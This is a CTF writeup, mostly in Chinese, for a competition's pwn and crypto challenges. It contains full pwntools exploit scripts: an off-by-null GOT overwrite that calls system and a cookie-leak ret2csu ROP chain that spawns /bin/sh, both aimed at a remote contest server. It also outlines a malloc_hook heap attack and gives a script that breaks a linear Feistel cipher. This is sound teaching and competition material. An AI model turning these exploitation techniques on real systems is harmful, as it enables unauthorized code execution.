# sixstars writeup

## gettingstart
使用gdb运行，在比较判断出下断点查看内存，按照内存的内容重新输入

## shoppingcart

在edit函数里存在溢出一个00字节，同时没有对index进行检查。

主要思路是通过连续添加20次money，利用后面的off by null修改bss上的指针，实现任意内存写。

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./task_shoppingCart"
elf=ELF(pwn_file)
libc=elf.libc
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("49.4.79.184",30645)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    log.debug("pie address: 0x%x"%elf.address)
    pause()

def add(size,name):
    r.sendlineafter("Now, buy buy buy!\n","1")
    r.sendlineafter("How long is your goods name?",str(size))
    r.sendafter("What is your goods name?",name)

def dele(idx):
    r.sendlineafter("Now, buy buy buy!\n","2")
    r.sendlineafter("Which goods that you don't need?\n",str(idx))

def edit(idx,buf):
    r.sendlineafter("Now, buy buy buy!\n","3")
    r.sendlineafter("Which goods you need to modify?\n",str(idx&0xffffffffffffffff))
    r.recvuntil("OK, what would you like to modify ")
    con=r.recvuntil(" to")[:-3]
    r.send(buf)
    return con

def add_money(buf):
    r.sendlineafter("EMMmmm, you will be a rich man!\n","1")
    r.sendlineafter("RMB or Dollar?\n",buf)

def out():
    r.sendlineafter("EMMmmm, you will be a rich man!\n","3")

add_money(p64(0xdeadbeef))
add_money(p64(0xdeadbeef))
add_money(p64(0xdeadbeef))
for i in range(17):
    add_money(p64(0xdeadbeef))
out()
elf.address=u64(edit(-47,"\x68").ljust(8,"\x00"))-0x202068
edit(-1,p64(0x202148+elf.address))
edit(-21,p64(elf.got["strtoul"]))

r.sendlineafter("Now, buy buy buy!\n","3")
r.sendlineafter("Which goods you need to modify?\n",str((-19)&0xffffffffffffffff))
r.recvuntil("OK, what would you like to modify ")
con=r.recvuntil(" to")[:-3]
libc.address=u64(con.ljust(8,"\x00"))-libc.sym["strtoul"]
r.send(p64(libc.sym["system"]))
r.sendline("/bin/sh\x00")
r.interactive()

```

## huwang
在隐藏菜单里输入name时内存越界可以泄露cookie，对轮数没有做检查，输入-1会导致循环卡死，这时再开起一个连接，/tmp/secret文件存在但是里面内容为空，即可通过md5的检查，进入内部的栈溢出函数，利用ret_to_csu leak出libc，然后拿到shell

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import hashlib
context.log_level="debug"
pwn_file="./huwang"
elf=ELF(pwn_file)
libc=elf.libc
pid=0
cookie=0
def hash(x):
    return hashlib.md5(x).hexdigest().decode("hex")
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
def get_cc():
    global pid
    if len(sys.argv)==1:
        r=process(pwn_file)
        pid=r.pid
    else:
        r=remote("49.4.79.184",30658)
        pid=0
    return r

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("cookie:0x%x"%cookie)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

def add(size,content):
    r.sendlineafter(">> \n","1")
    r.sendlineafter("size:",str(size))
    r.sendafter("content:",content)

def delete(idx):
    r.sendlineafter(">> \n","2")
    r.sendlineafter("index:",str(idx))

def brute(r,guess):
    name="a"*25
    r.sendlineafter(">> \n","666")
    r.sendafter("name\n",name)
    pause()
    r.sendlineafter("Do you want to guess the secret?\n",'y')
    r.sendlineafter("encrypt the secret:\n","1")
    r.sendafter("md5 of the secret\n",guess)
    data=r.recvline()
    print data

r=get_cc()
name="a"*25
r.sendlineafter(">> \n","666")
r.sendafter("name\n",name)
r.sendlineafter("Do you want to guess the secret?\n",'y')
r.sendlineafter("encrypt the secret:\n","-1")
r.close()

r=get_cc()
name="a"*0x19
r.sendlineafter(">> \n","666")
r.sendafter("name\n",name)
r.sendlineafter("Do you want to guess the secret?\n",'y')
r.sendlineafter("encrypt the secret:\n","1")
r.sendafter("Try to guess the md5 of the secret\n",hash("\x00"*0x10))
r.recvuntil(name)
cookie=u64("\x00"+r.recv(7))
r.sendafter("What`s your occupation?","a"*0xff)
r.sendafter("[Y/N]\n","Y\n")

def ret2csu(rdi,rsi,rdx,func_got):
    return p64(0)+p64(1)+p64(func_got)+p64(rdx)+p64(rsi)+p64(rdi)+p64(0x401550)+"a"*8
f={
    0x108:p64(cookie)+p64(0x603a00),
    0x118:p64(0x40156A)+ret2csu(elf.got["puts"],0,0,elf.got["puts"])+\
            ret2csu(0,0x603c00,0x100,elf.got["read"])+\
            ret2csu(0x603c08,0,0,0x603c00)
}
r.send(fit(f,filler="\x00"))
r.recvline()
libc.address=u64(r.recvline()[:-1].ljust(8,"\x00"))-libc.sym["puts"]
r.sendline(p64(libc.sym["system"])+"/bin/sh\x00")
r.interactive()

```

## calendar
比赛的时候没做出来，后来看了别人的writeup又实现了一遍
写的时候有可以多写一个字节，利用过程如下

- 伪造chunk ，free出unsort bin
- 构造fastbin 0x70的链，部分覆盖链上的fd指针，将其改为unsort bin的地址
- 将unsortbin的堆块头改为0x71，部分写将unsort bin 的fd，改到malloc hook 附近
- 申请0x70堆块拿到malloc hook 的块
- 再写unsortbin 的bk改为malloc hook-0x10地方，利用unsortbin attack在malloc hook 上写上一个libc的偏移地址
- 部分覆盖malloc hook 跳到onegadget上，概率为1/4096

## six
以前出过8个字节长的shellcode，这次直接减到六个，也是长了见识。比赛的时候一直想着跳到libc上的gadget上面去，本地也可以过，但是远程就是过不去。看了别人的writeup才想起来。

# fez_wirteup  

观察到这个加密函数位线性的，所以可以得出结果
给出测试的test 可以得到 l0 和 r0
我们知道加密轮数，所以得到的最终加密系数可以求出来
通过这个加密的结果，我们不需要知道密钥k只需要知道最终系数kl，和kr即可得出结果
所以，通过kl和kr 以及最终的密文，可以得到明文。

```python
# import binascii

# text = int(text)

# text_k = binascii.a2b_hex(text_k)

def xor(a,b):
    assert len(a)==len(b)
    c=""
    for i in range(len(a)):
        c+=chr(ord(a[i])^ord(b[i]))
    return c

def f(x,k):
    return xor(xor(x,k),7)
def round(M,K):
    L=M[0:27]
    R=M[27:54]
    new_l=R
    new_r=xor(xor(R,L),K)
    return new_l+new_r
def fez(m,K):
    for i in K:
        m=round(m,i)
    return m

t2 = '8cf87cc3c55369255b1c0dd4384092026aea1e37899675de8cd3a097f00a14a772ff135240fd03e77c9da02d7a2bc590fe797cfee990'
t2 = t2.decode('hex')

t1 = '6c34525bcc8c004abbb2815031542849daeade4f774425a6a49e545188f670ce4667df9db0b7ded2a25cdaa6e2a26f0d384d9699988f'
t1 = t1.decode('hex')

c = 'ec42b9876a716393a8d1776b7e4be84511511ba579404f59956ce6fd12fc6cbfba909c6e5a6ab3e746aec5d31dc62e480009317af1bb'
c = c.decode('hex')
# a = 'aaaaaaaaaaaaaaa'
# b = 'bbbbbbbbbbbbbbb'
# x = 'ccccccccccccccc'
# print xor(xor(xor(a,b),x),a)==xor(b,x)

cl = c[0:27]
cr = c[27:54]
l0 = t1[0:27]
r0 = t1[27:54]
l7 = t2[0:27]
r7 = t2[27:54]
l0_r0 = xor(l0,r0)
kl = xor(r0,l7)
kr = xor(l0_r0,r7)
mr = xor(cl,kl)
ml = xor(mr,xor(cr,kr))
m = ml+mr
print m
# import os

# f = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaa'

# assert len(f)<54
# f+=os.urandom(54-len(f))
# print f
# print bin(int(text_k))
```